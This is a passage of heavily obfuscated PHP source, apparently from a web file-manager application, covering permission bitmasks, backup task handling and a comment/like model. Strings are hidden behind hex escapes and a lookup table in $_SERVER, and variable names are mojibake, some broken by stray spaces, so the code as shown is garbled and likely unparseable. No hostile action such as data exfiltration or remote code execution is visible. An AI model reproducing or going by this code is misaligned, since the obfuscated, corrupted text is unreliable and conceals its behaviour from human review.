!= -1) { $§õÓÁíœ[$Ãå°×³·[79]] = $Ø†»‡ÙØ; } else { $”üã¨ÂØ = @ftp_chdir($this->connect, $¢å±óÁ); if (!$”üã¨ÂØ) { return !1; } $§õÓÁíœ[$Ãå°×³·[33]] = $Ãå°×³·[78]; } return $§õÓÁíœ; } protected function _isFolder($ÁÇ¨æŸ€) { $Éñ§Ü¤ =& $_SERVER[ìïæ“œî]; if ($ÁÇ¨æŸ€ == $Éñ§Ü¤[12] || $ÁÇ¨æŸ€ == $Éñ§Ü¤[8]) { return !0; } $Şô¨•á = $this->_objectMeta($ÁÇ¨æŸ€); return isset($Şô¨•á[$Éñ§Ü¤[33]]) && $Şô¨•á[$Éñ§Ü¤[33]] == $Éñ§Ü¤[78] ? !0 : !1; } } goto E–é çÊ¯; Fµ´£ÁğÔ´: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $µ‡èâ× =& $_SERVER[ìïæ“œî]; $ ©ñª¸· = array(array($µ‡èâ×[494] => LNG($µ‡èâ×[1947]), $µ‡èâ×[1948] => $µ‡èâ×[1949], $µ‡èâ×[1950] => 1, $µ‡èâ×[1951] => 1, $µ‡èâ×[1952] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($µ‡èâ×[494] => LNG($µ‡èâ×[1953]), $µ‡èâ×[1948] => $µ‡èâ×[1954], $µ‡èâ×[1950] => 2, $µ‡èâ×[1951] => 1, $µ‡èâ×[1952] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($µ‡èâ×[494] => LNG($µ‡èâ×[1955]), $µ‡èâ×[1948] => $µ‡èâ×[1956], $µ‡èâ×[1950] => 3, $µ‡èâ×[1951] => 1, $µ‡èâ×[1952] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($µ‡èâ×[494] => LNG($µ‡èâ×[1957]), $µ‡èâ×[1948] => $µ‡èâ×[1958], $µ‡èâ×[1950] => 4, $µ‡èâ×[1951] => 1, $µ‡èâ×[1952] => self::AUTH_SHOW | self::AUTH_VIEW), array($µ‡èâ×[494] => LNG($µ‡èâ×[1959]), $µ‡èâ×[1948] => $µ‡èâ×[1960], $µ‡èâ×[1950] => 5, $µ‡èâ×[1951] => 1, $µ‡èâ×[1952] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($µ‡èâ×[494] => LNG($µ‡èâ×[1961]), $µ‡èâ×[1948] => $µ‡èâ×[1962], $µ‡èâ×[1950] => 6, $µ‡èâ×[1951] => 1, $µ‡èâ×[1952] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($µ‡èâ×[494] => LNG($µ‡èâ×[1963]), $µ‡èâ×[1948] => $µ‡èâ×[1964], $µ‡èâ×[1950] => 7, $µ‡èâ×[1951] => 1, $µ‡èâ×[1952] => 0)); return $ ©ñª¸·; } public static function authCheck($ñ¹ãöÃ‹, $ç…µää­) { $è‡ˆÄ¨Ä =& $_SERVER[ìïæ“œî]; $ñ¹ãöÃ‹ = intval($ñ¹ãöÃ‹); if (KodUser::isRoot() && $GLOBALS[$è‡ˆÄ¨Ä[6]][$è‡ˆÄ¨Ä[1965]]) { return !0; } if ($ñ¹ãöÃ‹ <= 0) { return !1; } if (($ñ¹ãöÃ‹ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ñ¹ãöÃ‹ & $ç…µää­); } public static function authCheckShow($ú÷à‘ØÊ) { return self::authCheck($ú÷à‘ØÊ, self::AUTH_SHOW); } public static function authCheckView($¥³Ç´¨) { return self::authCheck($¥³Ç´¨, self::AUTH_VIEW); } public static function authCheckDownload($õ¼Î¹‘ı) { return self::authCheck($õ¼Î¹‘ı, self::AUTH_DOWNLOAD); } public static function authCheckUpload($·•ªØ¶Ã) { return self::authCheck($·•ªØ¶Ã, self::AUTH_UPLOAD); } public static function authCheckEdit($ÂÙõÒÙ) { return self::authCheck($ÂÙõÒÙ, self::AUTH_EDIT); } public static function authCheckRemove($©ŞéĞÄ) { return self::authCheck($©ŞéĞÄ, self::AUTH_REMOVE); } public static function authCheckShare($ÕïˆÛ›Ï) { return self::authCheck($ÕïˆÛ›Ï, self::AUTH_SHARE); } public static function authCheckComment($³»‰è‡) { return self::authCheck($³»‰è‡, self::AUTH_COMMENT); } public static function authCheckEvent($ö¡ë¬û¹) { return self::authCheck($ö¡ë¬û¹, self::AUTH_EVENT); } public static function authCheckRoot($˜ã´¼º) { return self::authCheck($˜ã´¼º, self::AUTH_ROOT); } public static function authCheckAction($¹ÍÛŞ‹, $–Ôá§±Ä) { $£–÷§£˜ =& $_SERVER[ìïæ“œî]; $îé•Ã„† = array($£–÷§£˜[1966] => self::AUTH_VIEW, $£–÷§£˜[1256] => self::AUTH_DOWNLOAD, $£–÷§£˜[110] => self::AUTH_UPLOAD, $£–÷§£˜[1915] => self::AUTH_EDIT, $£–÷§£˜[1914] => self::AUTH_REMOVE, $£–÷§£˜[1925] => self::AUTH_SHARE, $£–÷§£˜[430] => self::AUTH_COMMENT, $£–÷§£˜[1735] => self::AUTH_EVENT, $£–÷§£˜[1967] => self::AUTH_ROOT); if (!isset($îé•Ã„†[$–Ôá§±Ä])) { return; } $œš­Ãêœ = $îé•Ã„†[$–Ôá§±Ä]; $¹ÍÛŞ‹ = intval($¹ÍÛŞ‹); if ($¹ÍÛŞ‹ <= 0) { return !1; } if (($¹ÍÛŞ‹ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¹ÍÛŞ‹ & $œš­Ãêœ); } public static function authDisable($€è™üÏÏ, $êûäÁÌ) { if (intval($€è™üÏÏ) <= 0) { return 0; } return intval($€è™üÏÏ) & ~$êûäÁÌ; } public $optionType = "\123\171\x73\x74\x65\x6d\56\163\157\165\x72\143\145\x41\x75\164\x68\x4c\x69\x73\164"; public $field = array("\156\141\x6d\x65", "\x61\x75\164\150", "\x6c\141\x62\x65\154", "\x64\151\x73\160\154\141\171", "\163\x79\163\x74\x65\155", "\x73\157\162\x74"); public function initData() { $Òš’‹¾ = $this->authDefault(); foreach ($Òš’‹¾ as $ÉÊù¨îï) { $this->add($ÉÊù¨îï); } } public function findAuth($œçÒÇ™, $´Ó’€ùÅ) { $ÅÌ¼ùŸ– =& $_SERVER[ìïæ“œî]; $üƒ…Õ¿ò = parent::listData(); foreach ($üƒ…Õ¿ò as $»ªÕ£ò§) { $¸±ø‹“„ = intval($»ªÕ£ò§[$ÅÌ¼ùŸ–[487]]); if ($¸±ø‹“„ <= 0 || $»ªÕ£ò§[$ÅÌ¼ùŸ–[1968]] == 0) { continue; } if (($¸±ø‹“„ & $œçÒÇ™) != $œçÒÇ™) { continue; } if (($¸±ø‹“„ & $´Ó’€ùÅ) != 0) { continue; } return $»ªÕ£ò§[$ÅÌ¼ùŸ–[475]]; } return !1; } public function findAuthReadOnly() { $§à¹Å¨Î = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $Çèö“‘î = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($§à¹Å¨Î, $Çèö“‘î); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $‚¶Ì€ =& $_SERVER[ìïæ“œî]; $¿æª§µî = parent::listData(); $ÕÈ½È– = !1; foreach ($¿æª§µî as $á–ŞÔˆô) { if ($á–ŞÔˆô[$‚¶Ì€[487]] <= 0 || $á–ŞÔˆô[$‚¶Ì€[1968]] == $‚¶Ì€[228]) { continue; } if (!$ÕÈ½È–) { $ÕÈ½È– = $á–ŞÔˆô; continue; } if ($ÕÈ½È–[$‚¶Ì€[487]] > $á–ŞÔˆô[$‚¶Ì€[487]]) { $ÕÈ½È– = $á–ŞÔˆô; } } return $ÕÈ½È– ? $ÕÈ½È–[$‚¶Ì€[475]] : $‚¶Ì€[12]; } public function listData($±èÎ­Ãı = false, $Ğ…Ü‰Ì§ = "\163\x6f\x72\164", $‚ì¯èÄì = false) { return parent::listData($±èÎ­Ãı, $Ğ…Ü‰Ì§, $‚ì¯èÄì); } public function update($«£ÎÁ¤, $İÆë») { $¥ÈËÂà– =& $_SERVER[ìïæ“œî]; $³¥äŞ´æ = parent::listData($«£ÎÁ¤); $öšÒ©ø· = $this->findByName($İÆë»[$¥ÈËÂà–[32]]); if (!$³¥äŞ´æ || $öšÒ©ø· && $öšÒ©ø·[$¥ÈËÂà–[475]] != $³¥äŞ´æ[$¥ÈËÂà–[475]]) { return !1; } $this->filterAuth($İÆë»[$¥ÈËÂà–[487]]); return parent::update($«£ÎÁ¤, $İÆë»); } public function remove($Ûïö¸Ìı) { $êã¿ã„ = parent::listData($Ûïö¸Ìı); if (!$êã¿ã„ || $êã¿ã„[$_SERVER[ìïæ“œî][191]]) { return !1; } return parent::remove($Ûïö¸Ìı); } public function add($†ŞÒè‚Ú = array()) { $˜óûÄóÁ =& $_SERVER[ìïæ“œî]; if ($this->findByName($†ŞÒè‚Ú[$˜óûÄóÁ[32]])) { return !1; } $ˆ«ûõ¼æ = array($˜óûÄóÁ[32] => $˜óûÄóÁ[12], $˜óûÄóÁ[487] => 1, $˜óûÄóÁ[1969] => $˜óûÄóÁ[1956], $˜óûÄóÁ[1968] => 1, $˜óûÄóÁ[191] => 0, $˜óûÄóÁ[1970] => 0); $†ŞÒè‚Ú = array_merge($ˆ«ûõ¼æ, $†ŞÒè‚Ú); $†ŞÒè‚Ú[$˜óûÄóÁ[1970]] = $this->getSort(); $this->filterAuth($†ŞÒè‚Ú[$˜óûÄóÁ[487]]); return parent::insert($†ŞÒè‚Ú); } private function getSort() { $ÃÉ˜õÛÌ =& $_SERVER[ìïæ“œî]; $µÈ†áÒ = parent::listData(); $äôè¹—· = array_to_keyvalue($µÈ†áÒ, $ÃÉ˜õÛÌ[12], $ÃÉ˜õÛÌ[1970]); return empty($äôè¹—·) ? 0 : max($äôè¹—·) + 1; } private function filterAuth(&$ùÖ¥ÍŒÚ) { if (!$ùÖ¥ÍŒÚ) { return; } $¹™‰ıí = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $½şëĞÌ¬ = array(); foreach ($¹™‰ıí as $ı‘§äÙ ) { if ($ùÖ¥ÍŒÚ & $ı‘§äÙ ) { $½şëĞÌ¬[] = $ı‘§äÙ ; } } if (in_array(self::AUTH_ROOT, $½şëĞÌ¬)) { $ùÖ¥ÍŒÚ = array_sum($¹™‰ıí); return; } $™â«ˆˆ­ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($½şëĞÌ¬ as $ı‘§äÙ ) { if (isset($™â«ˆˆ­[$ı‘§äÙ ])) { $½şëĞÌ¬ = array_merge($½şëĞÌ¬, $™â«ˆˆ­[$ı‘§äÙ ]); } } $½şëĞÌ¬[] = self::AUTH_SHOW; $ùÖ¥ÍŒÚ = array_sum(array_unique($½şëĞÌ¬)); } public function sort($Â˜ÛĞ”, $ñÚòğÇ°) { return parent::update($Â˜ÛĞ”, $ñÚòğÇ°); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\x2e\142\x61\x63\x6b\x75\x70\114\x69\x73\x74"; public $field = array("\x69\x6f", "\x6e\141\155\145", "\163\164\x61\164\x75\x73", "\x63\157\156\x74\145\x6e\164", "\155\141\x6e\165\141\154", "\162\x65\x73\x75\x6c\164", "\164\x69\x6d\145\106\x72\x6f\x6d", "\164\x69\x6d\x65\x54\x6f"); public function config() { $šÆ»¼† =& $_SERVER[ìïæ“œî]; Action($šÆ»¼†[1971])->taskInit(); $€ìãÈí… = Model($šÆ»¼†[819])->get($šÆ»¼†[832]); $€ìãÈí… = json_decode($€ìãÈí…, !0); $€ìãÈí… = is_array($€ìãÈí…) ? $€ìãÈí… : array(); $this->parseContent($€ìãÈí…); unset($€ìãÈí…[$šÆ»¼†[1717]]); Model($šÆ»¼†[1716])->cacheClear(); $ÜÚôµÕÛ = $šÆ»¼†[1972]; $Òä¦ÏÊ˜ = Model($šÆ»¼†[1973])->findByKey($šÆ»¼†[1735], $ÜÚôµÕÛ); if (!$Òä¦ÏÊ˜) { $Òä¦ÏÊ˜ = array(); } if (isset($Òä¦ÏÊ˜[$šÆ»¼†[206]])) { $Òä¦ÏÊ˜[$šÆ»¼†[206]] = json_decode($Òä¦ÏÊ˜[$šÆ»¼†[206]], !0); } if (isset($€ìãÈí…[$šÆ»¼†[206]])) { $Òä¦ÏÊ˜[$šÆ»¼†[206]][$šÆ»¼†[1720]] = $€ìãÈí…[$šÆ»¼†[206]]; unset($€ìãÈí…[$šÆ»¼†[206]]); } return array_merge($Òä¦ÏÊ˜, $€ìãÈí…); } public function listData($â˜ŞŸó = false, $Ö¤ã‘’· = "\x6d\157\144\x69\146\171\x54\x69\x6d\x65", $‚í¥¶ğÌ = false) { $­¶±µ = parent::listData($â˜ŞŸó, $Ö¤ã‘’·, !0); if (!$­¶±µ) { return $­¶±µ; } if ($â˜ŞŸó) { $­¶±µ = array($­¶±µ); } foreach ($­¶±µ as &$˜—õ†º·) { $this->parseContent($˜—õ†º·); } return $â˜ŞŸó ? $­¶±µ[0] : $­¶±µ; } public function parseContent(&$›ĞÈÇø˜) { $—ÀàÃ±Õ =& $_SERVER[ìïæ“œî]; $ùíêÙÉ“ = _get($›ĞÈÇø˜, $—ÀàÃ±Õ[171], $—ÀàÃ±Õ[91]); if (!in_array($ùíêÙÉ“, array($—ÀàÃ±Õ[825], $—ÀàÃ±Õ[1188]))) { $›ĞÈÇø˜[$—ÀàÃ±Õ[171]] = $ùíêÙÉ“ == $—ÀàÃ±Õ[91] ? $—ÀàÃ±Õ[1188] : $—ÀàÃ±Õ[825]; } } public function lastItem() { $À¡áÖ‹ = $this->listData(); return !empty($À¡áÖ‹[0]) ? $À¡áÖ‹[0] : null; } public function kill($Øöµ¶’Û) { $İÌ¯‘ÌÎ =& $_SERVER[ìïæ“œî]; $–õãŸ‹ = $this->listData($Øöµ¶’Û); if (!$–õãŸ‹ || empty($–õãŸ‹[$İÌ¯‘ÌÎ[32]])) { return !0; } Task::kill($İÌ¯‘ÌÎ[831]); Task::kill($İÌ¯‘ÌÎ[849]); Task::kill($İÌ¯‘ÌÎ[858]); $°ÏÉÈ…€ = $–õãŸ‹[$İÌ¯‘ÌÎ[32]]; $Òğöª‹ = TEMP_FILES . $İÌ¯‘ÌÎ[828] . $°ÏÉÈ…€ . $İÌ¯‘ÌÎ[8]; IO::remove($Òğöª‹, !1); return $this->remove($Øöµ¶’Û); } public function remove($ÁÖÜŠ†) { $÷‡ŸÇÑ = $this->listData($ÁÖÜŠ†); if (!$÷‡ŸÇÑ) { return !0; } return $this->backupRemove($÷‡ŸÇÑ); } private function backupRemove($–Â£î­õ) { parent::remove($–Â£î­õ[$_SERVER[ìïæ“œî][475]]); $Óß˜ËŞò = $this->backupPath($–Â£î­õ); IO::remove($Óß˜ËŞò, !1); return !0; } private function backupPath($‹¼áİÆÛ) { $§¨ÔÚ… =& $_SERVER[ìïæ“œî]; $ŠÚ›Ëª = $‹¼áİÆÛ[$§¨ÔÚ…[32]]; $Õ¾Â¼±é = Model($§¨ÔÚ…[819])->get($§¨ÔÚ…[820]); $ÄšûâÇ• = substr(md5($§¨ÔÚ…[821] . $Õ¾Â¼±é . $ŠÚ›Ëª), 0, 8); return "\x7b\151\157\72{$‹¼áİÆÛ[$§¨ÔÚ…[801]]}\175\x2f\144\x61\x74\141\x62\141\x73\145\57\142\x61\x63\153\x75\x70\x2f" . $ŠÚ›Ëª . $§¨ÔÚ…[11] . $ÄšûâÇ•; } public function start() { $Œêªßû =& $_SERVER[ìïæ“œî]; if ($GLOBALS[$Œêªßû[6]][$Œêªßû[92]][$Œêªßû[1974]] != $Œêªßû[91]) { return !0; } $Á³É›ìû = $this->config(); if (!$Á³É›ìû || $Á³É›ìû[$Œêªßû[1717]] != $Œêªßû[91]) { return !1; } if ($Á³É›ìû[$Œêªßû[171]] == $Œêªßû[825]) { $¡ĞÇ†îğ = Model($Œêªßû[819])->get($Œêªßû[1301]); if ($¡ĞÇ†îğ == $Œêªßû[1302]) { $Á³É›ìû[$Œêªßû[171]] = $Œêªßû[1188]; } } $‹˜ÚúÚ¾ = $this->process(); foreach ($‹˜ÚúÚ¾ as $ÖÔÚÁéÍ) { if ($ÖÔÚÁéÍ) { return Task::restart($ÖÔÚÁéÍ[$Œêªßû[475]]); } } $Åä°¨Ì = new Backup(); $ÁÚˆ×İÇ = $Åä°¨Ì->db(); if ($ÁÚˆ×İÇ) { $ÁÚˆ×İÇ = $Åä°¨Ì->dbFile(); if ($ÁÚˆ×İÇ && $Á³É›ìû[$Œêªßû[171]] == $Œêªßû[825]) { $ÁÚˆ×İÇ = $Åä°¨Ì->file(); } } Backup::set(array($Œêªßû[799] => 1, $Œêªßû[810] => time())); return !0; } public function process() { $¹Ìµ§İş =& $_SERVER[ìïæ“œî]; $Ë‘ãğÓµ = array($¹Ìµ§İş[806] => Task::get($¹Ìµ§İş[831]), $¹Ìµ§İş[811] => Task::get($¹Ìµ§İş[849]), $¹Ìµ§İş[230] => Task::get($¹Ìµ§İş[858])); $•ıÚ = !1; foreach ($Ë‘ãğÓµ as &$„Æ‘ïçß) { if ($•ıÚ) { $„Æ‘ïçß = !1; continue; } if ($„Æ‘ïçß) { $˜§ãå’ = intval(_get($„Æ‘ïçß, $¹Ìµ§İş[1752], 0)); if (time() - $˜§ãå’ > 7200) { Task::kill($„Æ‘ïçß[$¹Ìµ§İş[475]]); $•ıÚ = !0; $„Æ‘ïçß = !1; } } } return $Ë‘ãğÓµ; } public function restore() { $ŒµƒØ«š =& $_SERVER[ìïæ“œî]; ActionCall($ŒµƒØ«š[1115], !0, 1); ActionCall($ŒµƒØ«š[1115], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\x6d\145\156\x74"; protected $tableMeta = array("\x74\x61\x62\154\x65\116\x61\155\x65" => "\143\x6f\x6d\x6d\x65\x6e\x74\137\155\x65\164\x61", "\155\145\164\141\x46\x69\145\x6c\144" => "\x63\157\155\x6d\x65\x6e\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($íÑ®éã) { $ üşšÉÏ =& $_SERVER[ìïæ“œî]; if ($íÑ®éã[$ üşšÉÏ[1975]]) { $€“°ûê× = $this->where(array($ üşšÉÏ[1976] => $íÑ®éã[$ üşšÉÏ[1975]]))->find(); if (!$€“°ûê× || $€“°ûê×[$ üşšÉÏ[190]] != $íÑ®éã[$ üşšÉÏ[190]] || $€“°ûê×[$ üşšÉÏ[569]] != $íÑ®éã[$ üşšÉÏ[569]]) { return !1; } $this->where(array($ üşšÉÏ[1976] => $íÑ®éã[$ üşšÉÏ[1975]]))->setAdd($ üşšÉÏ[1977], 1); } $íÑ®éã[$ üşšÉÏ[1978]] = 0; $íÑ®éã[$ üşšÉÏ[1977]] = 0; $íÑ®éã[$ üşšÉÏ[799]] = 1; return $this->add($íÑ®éã); } public function commentCount($ó’çéÍÅ, $“õø¹£õ, $ÊÉ­‚ò­ = false) { $““Åı =& $_SERVER[ìïæ“œî]; if (!$ó’çéÍÅ) { return array(); } if (is_string($ó’çéÍÅ) || is_int($ó’çéÍÅ)) { $ó’çéÍÅ = array($ó’çéÍÅ); } $±Ú¶ë = array($““Åı[569], $““Åı[1979] => $““Åı[565]); $¦Ç‚ûÙ¢ = array($““Åı[569] => array($““Åı[7], $ó’çéÍÅ), $““Åı[190] => $“õø¹£õ); if ($ÊÉ­‚ò­) { $¦Ç‚ûÙ¢[$““Åı[1747]] = $ÊÉ­‚ò­; } $Ü‡«äã = $this->field($±Ú¶ë)->where($¦Ç‚ûÙ¢)->group($““Åı[569])->select(); return array_to_keyvalue($Ü‡«äã, $““Åı[569], $““Åı[565]); } public function starTarget($Î ¦±´², $¥Üş˜–•) { $•’÷–Œ´ =& $_SERVER[ìïæ“œî]; $Ÿá‘‰»¼ = $Î ¦±´² + self::TYPE_STAR_OFFSET; $ƒ¢‘µÔ™ = array($•’÷–Œ´[1747] => USER_ID, $•’÷–Œ´[190] => $Ÿá‘‰»¼, $•’÷–Œ´[569] => $¥Üş˜–•); $İÜÎÃÕâ = $this->where($ƒ¢‘µÔ™)->find(); if ($İÜÎÃÕâ) { return $this->where(array($•’÷–Œ´[475] => $İÜÎÃÕâ[$•’÷–Œ´[475]]))->delete(); } $ç¥®ˆÈ = array($•’÷–Œ´[1975] => 0, $•’÷–Œ´[1747] => USER_ID, $•’÷–Œ´[799] => 1, $•’÷–Œ´[171] => $•’÷–Œ´[12], $•’÷–Œ´[190] => $Ÿá‘‰»¼, $•’÷–Œ´[569] => $¥Üş˜–•, $•’÷–Œ´[1978] => 0, $•’÷–Œ´[1977] => 0); return $this->add($ç¥®ˆÈ); } public function starTargetCount($›Û­óÒı, $ŸÆòĞ‚Ù) { $˜ù»Æ”÷ =& $_SERVER[ìïæ“œî]; $úÜààŠÇ = $ŸÆòĞ‚Ù + self::TYPE_STAR_OFFSET; $×øï×æş = $this->commentCount($›Û­óÒı, $úÜààŠÇ); $ƒ¼òÎ¥· = $this->commentCount($›Û­óÒı, $úÜààŠÇ, USER_ID); return array($˜ù»Æ”÷[1980] => $×øï×æş, $˜ù»Æ”÷[1981] => $ƒ¼òÎ¥·); } public function starTargetUserList($Ôˆ±îáê, $ò¾üÓØÏ) { $™İ«ÍÇõ =& $_SERVER[ìïæ“œî]; $µÒÌâÂü = $Ôˆ±îáê + self::TYPE_STAR_OFFSET; $ñ×´£ÀÙ = array($™İ«ÍÇõ[569] => $ò¾üÓØÏ, $™İ«ÍÇõ[190] => $µÒÌâÂü); $ó°Û¾¯ß = $this->where($ñ×´£ÀÙ)->count(); $ïÛÏêó = array($™İ«ÍÇõ[332] => $ó°Û¾¯ß, $™İ«ÍÇõ[1982] => array()); if (!$ó°Û¾¯ß) { return $ïÛÏêó; } $¡áõÙ²à = $this->field($™İ«ÍÇõ[1747])->where($ñ×´£ÀÙ)->limit(500)->select(); $¡áõÙ²à = array_to_keyvalue($¡áõÙ²à, $™İ«ÍÇõ[12], $™İ«ÍÇõ[1747]); $ïÛÏêó[$™İ«ÍÇõ[1982]] = Model($™İ«ÍÇõ[577])->userListInfo($¡áõÙ²à); return $ïÛÏêó; } public function prasiseUserList($‰ŠÖ¢Üî) { $ßÎ¾ÑÏê =& $_SERVER[ìïæ“œî]; $º¬êÅ½§ = array($ßÎ¾ÑÏê[1983] => $‰ŠÖ¢Üî); $¬®Ü¥ÅŞ = $this->where($º¬êÅ½§)->find(); $Ğ½Ä§Ÿø = _get($¬®Ü¥ÅŞ, $ßÎ¾ÑÏê[1978], 0); $ş¢§ü‘Û = array($ßÎ¾ÑÏê[332] => $Ğ½Ä§Ÿø, $ßÎ¾ÑÏê[1982] => array()); if (!$Ğ½Ä§Ÿø) { return $ş¢§ü‘Û; } $÷–ºùÕ¯ = Model($ßÎ¾ÑÏê[1984])->field($ßÎ¾ÑÏê[1747])->where($º¬êÅ½§)->limit(500)->select(); $÷–ºùÕ¯ = array_to_keyvalue($÷–ºùÕ¯, $ßÎ¾ÑÏê[12], $ßÎ¾ÑÏê[1747]); $ş¢§ü‘Û[$ßÎ¾ÑÏê[1982]] = Model($ßÎ¾ÑÏê[577])->userListInfo($÷–ºùÕ¯); return $ş¢§ü‘Û; } public function remove($Ó¡–³) { $Ï¡Ö¨ =& $_SERVER[ìïæ“œî]; $ä•¶Õ’Ÿ = array($Ï¡Ö¨[1976] => $Ó¡–³); $¬›ÒÁ¥ = $this->where($ä•¶Õ’Ÿ)->find(); if ($¬›ÒÁ¥[$Ï¡Ö¨[1975]]) { $this->where(array($Ï¡Ö¨[1976] => $¬›ÒÁ¥[$Ï¡Ö¨[1975]]))->setAdd($Ï¡Ö¨[1977], -1); } return $this->where($ä•¶Õ’Ÿ)->delete(); } public function edit($ÙÈˆ¦ÜÁ, $“‰ã‡Ğª) { $ã¬å–ŞË =& $_SERVER[ìïæ“œî]; $¦è™ÎÒ˜ = array($ã¬å–ŞË[1976] => $ÙÈˆ¦ÜÁ); return $this->where($¦è™ÎÒ˜)->save(array($ã¬å–ŞË[1985] => $“‰ã‡Ğª)); } public function prasise($ —°°âÜ) { $ÂÍ…¸¹Ÿ =& $_SERVER[ìïæ“œî]; $Î‰ãğû = Model($ÂÍ…¸¹Ÿ[1986]); $ıÇâÕíı = array($ÂÍ…¸¹Ÿ[1976] => $ —°°âÜ, $ÂÍ…¸¹Ÿ[1738] => USER_ID); $Ë¾„¢Ş´ = $Î‰ãğû->where($ıÇâÕíı)->find(); if (!$Ë¾„¢Ş´) { $Î‰ãğû->add($ıÇâÕíı); $òÎƒ½äÏ = $this->where(array($ÂÍ…¸¹Ÿ[1976] => $ —°°âÜ))->setAdd($ÂÍ…¸¹Ÿ[1978], 1); } else { $Î‰ãğû->where($ıÇâÕíı)->delete(); $òÎƒ½äÏ = $this->where(array($ÂÍ…¸¹Ÿ[1976] => $ —°°âÜ))->setAdd($ÂÍ…¸¹Ÿ[1978], -1); } return $òÎƒ½äÏ; } public function targetInfo($œ‚Öİ±®, $ß¤Ì ç) { $Ïì­®Í¸ =& $_SERVER[ìïæ“œî]; $ÚŸÑûÁß = array($Ïì­®Í¸[648] => $œ‚Öİ±®, $Ïì­®Í¸[649] => $ß¤Ì ç); $¡×¯›í  = $this->where($ÚŸÑûÁß)->count(); $‚ÆÊ€Àª = "\122\111\107\x48\124\x20\x4a\117\x49\116\40{$this->tablePrefix}\x63\x6f\155\x6d\145\x6e\164\137\x70\162\x61\151\x73\145\40\x73\x74\x61\x72\40\x6f\156\40\143\157\155\x6d\145\156\164\56\x63\x6f\x6d\155\145\x6e\x74\111\x44\x20\75\x20\163\164\x61\x72\x2e\143\157\x6d\155\145\156\x74\x49\x44"; $¤‚¢Ñß = $this->alias($Ïì­®Í¸[430])->where($ÚŸÑûÁß)->join($‚ÆÊ€Àª, $Ïì­®Í¸[1987])->count(); $ç‹áËë® = array($Ïì­®Í¸[1988] => $¡×¯›í , $Ïì­®Í¸[1989] => $¤‚¢Ñß); return $ç‹áËë®; } public function listData($¾‚Ş•) { $©ŞóÒ =& $_SERVER[ìïæ“œî]; if (isset($¾‚Ş•[$©ŞóÒ[1990]])) { if ($¾‚Ş•[$©ŞóÒ[1990]]) { $¾‚Ş•[$©ŞóÒ[1983]] = array($©ŞóÒ[1069], intval($¾‚Ş•[$©ŞóÒ[1990]])); } unset($¾‚Ş•[$©ŞóÒ[1990]]); } if (isset($¾‚Ş•[$©ŞóÒ[1991]])) { if ($¾‚Ş•[$©ŞóÒ[1991]]) { $¾‚Ş•[$©ŞóÒ[1983]] = array($©ŞóÒ[1066], intval($¾‚Ş•[$©ŞóÒ[1991]])); } unset($¾‚Ş•[$©ŞóÒ[1991]]); } return $this->_listData($¾‚Ş•); } private function _listData($è•ø¡æù) { $ü–Ğ¤ ‰ =& $_SERVER[ìïæ“œî]; $ÛÀü‰ = $this->where($è•ø¡æù)->_makeOrder()->selectPage(100); $this->_listAppendParent($ÛÀü‰[$ü–Ğ¤ ‰[445]]); $this->_listAppendUser($ÛÀü‰[$ü–Ğ¤ ‰[445]]); $this->_listAppendMeta($ÛÀü‰[$ü–Ğ¤ ‰[445]]); return $ÛÀü‰; } private function _makeOrder() { $ÖšçäÖä =& $_SERVER[ìïæ“œî]; $Şº²é× = array($ÖšçäÖä[1978], $ÖšçäÖä[1977], $ÖšçäÖä[231]); $õ‡å†œ = Input::get($ÖšçäÖä[530], $ÖšçäÖä[7], $ÖšçäÖä[497], $Şº²é×); $ªÅó òâ = Input::get($ÖšçäÖä[531], $ÖšçäÖä[7], $ÖšçäÖä[1740], array($ÖšçäÖä[1992], $ÖšçäÖä[526])); $÷ğÜ¨‰¶ = $õ‡å†œ . $ÖšçäÖä[53] . $ªÅó òâ; return $this->order($÷ğÜ¨‰¶); } private function _listAppendParent(&$¶ôÚÍº‰) { $èú·º =& 